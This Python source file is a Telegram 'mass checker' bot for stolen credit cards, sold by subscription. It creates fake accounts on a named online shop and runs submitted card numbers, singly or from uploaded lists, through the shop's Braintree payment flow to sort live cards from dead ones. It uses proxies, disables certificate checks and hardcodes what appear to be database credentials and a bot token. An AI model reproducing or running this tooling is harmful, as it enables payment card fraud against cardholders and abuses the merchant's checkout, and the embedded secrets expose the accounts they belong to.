import asyncio
import logging
import os
from datetime import datetime, timedelta
import random
import string
import time
import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import motor.motor_asyncio
from bs4 import BeautifulSoup
import re
import base64
import user_agent
import ssl

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# ========================= DATABASE =========================
client = motor.motor_asyncio.AsyncIOMotorClient(os.getenv('MONGODB_URI', 'mongodb+srv://ElectraOp:BGMI272@cluster0.1jmwb.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0'))
db = client['fn_mass_checker']
users_collection = db['users']
keys_collection = db['keys']

# ========================= CONFIG =========================
TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '8009942983:AAE_sn8PdZ6ekBis3PMyBpv9Vyo0cP24b_c')
OWNER_ID = 7593550190

PROXY = True
try:
    with open('proxies.txt', 'r') as f:
        PROXY_LIST = [line.strip() for line in f if line.strip()]
except:
    PROXY_LIST = []

user = user_agent.generate_user_agent()
TIERS = {'Gold': 500, 'Platinum': 1000, 'Owner': 3000}

check_queue = asyncio.Queue()
stop_checking = {}

# ========================= GENERATORS =========================
def generate_full_name():
    first = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "James", "Emma", "Liam"]
    last = ["Khalil", "Abdullah", "Smith", "Johnson", "Williams", "Brown", "Davis"]
    return random.choice(first), random.choice(last)

def generate_address():
    cities = ["London", "Manchester", "Birmingham", "Leeds"]
    streets = ["Baker St", "Oxford St", "High Street", "King Street"]
    zips = ["SW1A 1AA", "M1 1AE", "B1 1AA", "LS1 1UR"]
    city = random.choice(cities)
    return city, "England", f"{random.randint(1,999)} {random.choice(streets)}", random.choice(zips)

def generate_email():
    return ''.join(random.choices(string.ascii_lowercase, k=10)) + "@gmail.com"

def generate_username():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=15))

def generate_phone():
    return "7" + ''.join(random.choices(string.digits, k=10))

def generate_code(l=36):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=l))

# ========================= BIN LOOKUP =========================
async def get_bin_details(bin_number):
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=10) as r:
                if r.status == 200:
                    j = await r.json()
                    return (
                        j.get('bank', 'Unknown'),
                        j.get('brand', 'Unknown').capitalize(),
                        j.get('level', 'Unknown'),
                        j.get('type', 'Unknown').upper(),
                        j.get('country_name', 'Unknown'),
                        j.get('country_flag', '')
                    )
    except: pass
    return "Unknown", "Unknown", "Unknown", "Unknown", "Unknown", ""

async def test_proxy(p):
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get("https://www.google.com", proxy=p, timeout=6, ssl=False) as r:
                return r.status == 200
    except: return False

# ========================= MAIN CHECKER (bebebrands revived 2025) =========================
async def check_cc(cc_details):
    cc, mes, ano, cvv = cc_details.split('|')
    if len(mes) == 1: mes = f'0{mes}'
    if len(ano) == 2: ano = f'20{ano}'
    full = f"{cc}|{mes}|{ano}|{cvv}"

    bin_number = cc[:6]
    issuer, card_type, card_level, card_type_category, country_name, country_flag = await get_bin_details(bin_number)

    start_time = time.time()
    first_name, last_name = generate_full_name()
    city, _, street_address, zip_code = generate_address()
    acc = generate_email()
    username = generate_username()
    num = generate_phone()

    proxy_status = "None"
    proxy_url = None
    if PROXY and PROXY_LIST:
        proxy_url = random.choice(PROXY_LIST)
        proxy_status = "Live" if await test_proxy(proxy_url) else "Dead"
    proxies = {'http': proxy_url, 'https': proxy_url} if proxy_url and "Live" in proxy_status else None

    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    ssl_ctx.minimum_version = ssl.TLSVersion.TLSv1_2

    connector = aiohttp.TCPConnector(ssl=ssl_ctx, limit=100, limit_per_host=30)
    timeout = aiohttp.ClientTimeout(total=60)

    headers = {
        'user-agent': user,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'accept-encoding': 'gzip, deflate, br',
        'origin': 'https://www.bebebrands.com',
        'referer': 'https://www.bebebrands.com/',
        'cookie': 'cookie_notice_accepted=true',
        'upgrade-insecure-requests': '1'
    }

    try:
        async with aiohttp.ClientSession(headers=headers, connector=connector, timeout=timeout) as session:
            # 1. Register
            async with session.get('https://www.bebebrands.com/my-account/', proxy=proxies['http'] if proxies else None) as r:
                text = await r.text()
                reg_nonce = re.search(r'name="woocommerce-register-nonce" value="([^"]+)"', text).group(1)

            await session.post('https://www.bebebrands.com/my-account/', data={
                'username': username, 'email': acc, 'password': 'SandeshThePapa@',
                'woocommerce-register-nonce': reg_nonce, 'register': 'Register'
            }, proxy=proxies['http'] if proxies else None)

            # 2. Address
            async with session.get('https://www.bebebrands.com/my-account/edit-address/billing/', proxy=proxies['http'] if proxies else None) as r:
                text = await r.text()
                addr_nonce = re.search(r'name="woocommerce-edit-address-nonce" value="([^"]+)"', text).group(1)

            await session.post('https://www.bebebrands.com/my-account/edit-address/billing/', data={
                'billing_first_name': first_name, 'billing_last_name': last_name, 'billing_country': 'GB',
                'billing_address_1': street_address, 'billing_city': city, 'billing_postcode': zip_code,
                'billing_phone': num, 'billing_email': acc, 'save_address': 'Save address',
                'woocommerce-edit-address-nonce': addr_nonce
            }, proxy=proxies['http'] if proxies else None)

            # 3. Payment nonces
            async with session.get('https://www.bebebrands.com/my-account/add-payment-method/', proxy=proxies['http'] if proxies else None) as r:
                text = await r.text()
                add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"', text).group(1)
                client_nonce = re.search(r'client_token_nonce":"([^"]+)"', text).group(1)

            # 4. Client token
            resp = await session.post('https://www.bebebrands.com/wp-admin/admin-ajax.php', data={
                'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client_nonce
            }, proxy=proxies['http'] if proxies else None)
            token_json = await resp.json()
            auth_fp = re.search(r'"authorizationFingerprint":"([^"]+)"', base64.b64decode(token_json['data']).decode()).group(1)

            # 5. Tokenize
            tk_json = {
                "clientSdkMetadata": {"source": "client","integration": "custom","sessionId": generate_code()},
                "query": 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }',
                "variables": {"input": {"creditCard": {"number": cc,"expirationMonth": mes,"expirationYear": ano,"cvv": cvv},"options": {"validate": False}}}
            }
            async with session.post('https://payments.braintree-api.com/graphql', json=tk_json, headers={
                'authorization': f'Bearer {auth_fp}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json'
            }, proxy=proxies['http'] if proxies else None) as r:
                data = await r.json()
                if 'errors' in data:
                    return {**default_result(), 'card': full, 'status': 'declined', 'message': data['errors'][0]['message'], 'time_taken': round(time.time()-start_time,2), 'proxy_status': proxy_status}
                token = data['data']['tokenizeCreditCard']['token']

            # 6. Add payment method
            await session.post('https://www.bebebrands.com/my-account/add-payment-method/', data=[
                ('payment_method', 'braintree_credit_card'),
                ('wc_braintree_credit_card_payment_nonce', token),
                ('wc_braintree_device_data', '{"correlation_id":"deadbeef123"}'),
                ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
                ('woocommerce-add-payment-method-nonce', add_nonce),
                ('woocommerce_add_payment_method', '1')
            ], headers={'content-type': 'application/x-www-form-urlencoded'}, proxy=proxies['http'] if proxies else None)

            # 7. Final result
            async with session.get('https://www.bebebrands.com/my-account/payment-methods/', proxy=proxies['http'] if proxies else None) as r:
                final_text = await r.text()

        time_taken = round(time.time() - start_time, 2)
        lower = final_text.lower()

        if any(x in lower for x in ['payment method successfully added','nice! new payment method added','insufficient funds','duplicate card']):
            status = 'approved'; msg = "Approved"
        elif 'card issuer declined cvv' in lower:
            status = 'ccn'; msg = "CCN Live - CVV Mismatch"
        else:
            soup = BeautifulSoup(final_text, 'html.parser')
            err = soup.select_one('.woocommerce-error li')
            msg = err.text.strip() if err else "Declined"
            status = 'declined'

        return {
            'card': full, 'status': status, 'message': msg, 'time_taken': time_taken,
            'proxy_status': proxy_status, 'issuer': issuer or "Unknown",
            'card_type': card_type or "N/A", 'card_level': card_level or "N/A",
            'card_type_category': card_type_category or "N/A",
            'country_name': country_name or "Unknown", 'country_flag': country_flag or ""
        }

    except Exception as e:
        return {
            'card': full, 'status': 'error', 'message': str(e)[:200],
            'time_taken': round(time.time() - start_time, 2), 'proxy_status': proxy_status,
            'issuer': issuer or "Unknown", 'card_type': card_type or "N/A",
            'card_level': card_level or "N/A", 'card_type_category': card_type_category or "N/A",
            'country_name': country_name or "Unknown", 'country_flag': country_flag or ""
        }

def default_result():
    return {'issuer':'Unknown','card_type':'N/A','card_level':'N/A','card_type_category':'N/A','country_name':'Unknown','country_flag':''}

# ========================= SINGLE CHECK (FIXED) =========================
async def single_check(user_id, cc_details, update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = await users_collection.find_one({'user_id': user_id})
    checking_msg = await update.message.reply_text("Checking Your Cc Please Wait..")
    
    result = await check_cc(cc_details)
    await checking_msg.delete()

    card_info = f"{result.get('card_type','N/A')} - {result.get('card_level','N/A')} - {result.get('card_type_category','N/A')}"
    issuer = result.get('issuer', 'Unknown')
    country_display = f"{result.get('country_name','Unknown')} {result.get('country_flag','')}".strip()
    checked_by = f"<a href='tg://user?id={user_id}'>{user_id}</a>"
    tier = user.get('tier', 'Free') if user else 'Free'

    if result['status'] == 'approved':
        text = (f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅\n\n"
                f"[Card] <code>{result['card']}</code>\n"
                f"[Gateway] Braintree Auth\n"
                f"[Response] Approved ✅\n\n"
                f"[Info] {card_info}\n"
                f"[Issuer] {issuer} 🏛\n"
                f"[Country] {country_display}\n\n"
                f"[Time] {result['time_taken']} seconds\n"
                f"[Proxy] {result['proxy_status']}\n"
                f"[Checked By] {checked_by} {tier}\n"
                f"[Bot] <a href='tg://user?id=8009942983'>𝙁𝙉 𝘽3 𝘼𝙐𝙏𝙃</a>")
    elif result['status'] == 'ccn':
        text = (f"𝐂𝐂𝐍 ✅\n\n"
                f"[Card] <code>{result['card']}</code>\n"
                f"[Gateway] Braintree Auth\n"
                f"[Response] {result['message']}\n\n"
                f"[Info] {card_info}\n"
                f"[Issuer] {issuer} 🏛\n"
                f"[Country] {country_display}\n\n"
                f"[Time] {result['time_taken']} seconds\n"
                f"[Proxy] {result['proxy_status']}\n"
                f"[Checked By] {checked_by} {tier}\n"
                f"[Bot] <a href='tg://user?id=8009942983'>𝙁𝙉 𝘽3 𝘼𝙐𝙏𝙃</a>")
    else:
        text = (f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌\n\n"
                f"[Card] <code>{result['card']}</code>\n"
                f"[Gateway] Braintree Auth\n"
                f"[Response] {result['message']}\n\n"
                f"[Info] {card_info}\n"
                f"[Issuer] {issuer} 🏛\n"
                f"[Country] {country_display}\n\n"
                f"[Time] {result['time_taken']} seconds\n"
                f"[Proxy] {result['proxy_status']}\n"
                f"[Checked By] {checked_by} {tier}\n"
                f"[Bot] <a href='tg://user?id=8009942983'>𝙁𝙉 𝘽3 𝘼𝙐𝙏𝙃</a>")

    await update.message.reply_text(text, parse_mode='HTML', disable_web_page_preview=True)

    if user:
        await users_collection.update_one({'user_id': user_id}, {'$inc': {'checked': 1}}, upsert=True)

# ========================= BULK CHECK (FULLY FIXED) =========================
async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    user = await users_collection.find_one({'user_id': user_id})
    if not user or user.get('expiration', datetime.min) < datetime.now():
        await update.message.reply_text("No active subscription. /redeem <key>")
        return

    file = await update.message.document.get_file()
    path = await file.download_to_drive()
    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
        ccs = [line.strip() for line in f if '|' in line and len(line.split('|')) == 4]

    limit = TIERS.get(user.get('tier', 'Gold'), 500)
    if len(ccs) > limit:
        await update.message.reply_text(f"Your tier allows max {limit} cards")
        return

    stop_checking[user_id] = False
    msg = await update.message.reply_text("Starting bulk check...")
    approved = declined = 0
    hits = []
    start = time.time()

    for cc in ccs:
        if stop_checking.get(user_id, False):
            await msg.edit_text("Stopped by user")
            break

        result = await check_cc(cc)
        card_info = f"{result.get('card_type','N/A')} - {result.get('card_level','N/A')} - {result.get('card_type_category','N/A')}"
        issuer = result.get('issuer', 'Unknown')
        country = f"{result.get('country_name','Unknown')} {result.get('country_flag','')}".strip()

        if result['status'] == 'approved':
            approved += 1
            hits.append(cc)
            await update.message.reply_text(f"Approved ✅\n<code>{cc}</code>\n{card_info} | {issuer} | {country}", parse_mode='HTML')
        elif result['status'] == 'ccn':
            approved += 1
            hits.append(cc)

        declined += 1 if result['status'] == 'declined' else 0

        keyboard = [[InlineKeyboardButton(f"Approved: {approved}", callback_data='a')],
                    [InlineKeyboardButton(f"Declined: {declined}", callback_data='d')],
                    [InlineKeyboardButton(f"Total: {len(ccs)}", callback_data='t')],
                    [InlineKeyboardButton("STOP", callback_data='stop')]]
        await msg.edit_text(f"Checking... {approved}+{declined}/{len(ccs)}", reply_markup=InlineKeyboardMarkup(keyboard))
        await asyncio.sleep(0.1)

    if hits:
        hitfile = f"hits_{user_id}.txt"
        with open(hitfile, 'w') as f:
            f.write('\n'.join(hits))
        with open(hitfile, 'rb') as f:
            await context.bot.send_document(update.message.chat_id, f, caption=f"{approved} Hits")
        os.remove(hitfile)

    await users_collection.update_one({'user_id': user_id}, {'$inc': {'checked': len(ccs)}}, upsert=True)

# ========================= COMMANDS =========================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("Upload Combo", callback_data='upload_files')]]
    await update.message.reply_text(
        "🔥 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐅𝐍 𝐌𝐀𝐒𝐒 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐁𝐎𝐓!\n\n"
        "/chk cc|mm|yy|cvv → single check\n"
        "Upload .txt → bulk check",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    user = await users_collection.find_one({'user_id': user_id})
    if not user or user.get('expiration', datetime.min) < datetime.now():
        await update.message.reply_text("No subscription. /redeem <key>")
        return
    cc = ' '.join(context.args)
    if not cc or len(cc.split('|')) != 4:
        await update.message.reply_text("Usage: /chk 4242424242424242|12|27|123")
        return
    await check_queue.put((user_id, cc, update, context))

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == 'stop':
        stop_checking[query.from_user.id] = True

# ========================= QUEUE WORKER =========================
async def process_queue():
    while True:
        if not check_queue.empty():
            user_id, cc, upd, ctx = await check_queue.get()
            await single_check(user_id, cc, upd, ctx)
        await asyncio.sleep(0.1)

# ========================= MAIN =========================
def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("chk", chk))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(CallbackQueryHandler(button))
    asyncio.create_task(process_queue())
    app.run_polling()

if __name__ == '__main__':
    main()
